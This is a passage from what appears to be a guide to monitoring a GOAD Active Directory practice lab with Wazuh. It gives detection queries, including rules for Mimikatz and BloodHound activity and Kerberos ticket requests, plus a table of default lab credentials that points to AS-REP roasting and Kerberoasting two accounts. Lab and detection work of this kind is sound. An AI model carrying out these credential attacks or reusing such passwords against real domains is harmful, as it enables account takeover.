| Custom GOAD rules only | `rule.groups: "goad"` |
| High severity (level ≥ 10) | `rule.level >= 10` |
| Specific agent | `agent.name: "kingslanding"` |
| Failed Windows logons | `data.win.system.eventID: "4625"` |
| Successful logons | `data.win.system.eventID: "4624"` |
| Sysmon process creation | `data.win.system.eventID: "1" and data.win.system.providerName: "Microsoft-Windows-Sysmon"` |
| Kerberos TGS requests | `data.win.system.eventID: "4769"` |
| Kerberos TGT requests | `data.win.system.eventID: "4768"` |
| BloodHound / SharpHound | `rule.id: 100105` |
| Mimikatz patterns | `rule.id: 100106` |

---

## Where to Go Next

- **Atomic Red Team** — `Invoke-AtomicTest` systematically runs every MITRE technique; pair with Wazuh to find coverage gaps
- **Slack/webhook alerting** — add an `<integration>` block in `ossec.conf` for level ≥ 10 alerts
- **File Integrity Monitoring** — already partially on; tune for `\\SYSVOL\sevenkingdoms.local\Policies\`
- **Vulnerability detection module** — Wazuh can match installed software against CVE feeds
- **Active response** — auto-kill processes or block IPs on rule match
- **Custom decoders** — for application-specific logs (IIS, MSSQL audit, ADCS)
- **MITRE ATT&CK navigator export** — visualize which techniques you've detected vs. missed across all test attacks

---

## Default Credentials Reference

| Service | URL/Host | Username | Password |
|---------|----------|----------|----------|
| Wazuh dashboard | https://10.3.10.99 | `admin` | `Wazuh-123` |
| GOAD domain admin | sevenkingdoms.local | `stephen.travolta` | `Password123!` |
| GOAD pre-auth disabled | sevenkingdoms.local | `s.baratheon` | (use AS-REP roast) |
| GOAD SPN user | sevenkingdoms.local | `j.snow` | (use Kerberoast) |
| Ludus admin | https://&lt;ludus-ip&gt;:8080 | `admin` | (your API key) |

---

*Last verified on GOAD-Light + Wazuh 4.8.0 + Ludus on Proxmox VE 8.x*

## References

- GOAD: <https://github.com/Orange-Cyberdefense/GOAD>
- GOAD walkthroughs: <https://orange-cyberdefense.github.io/GOAD/labs/GOAD-Light/>
- Ludus docs: <https://docs.ludus.cloud>
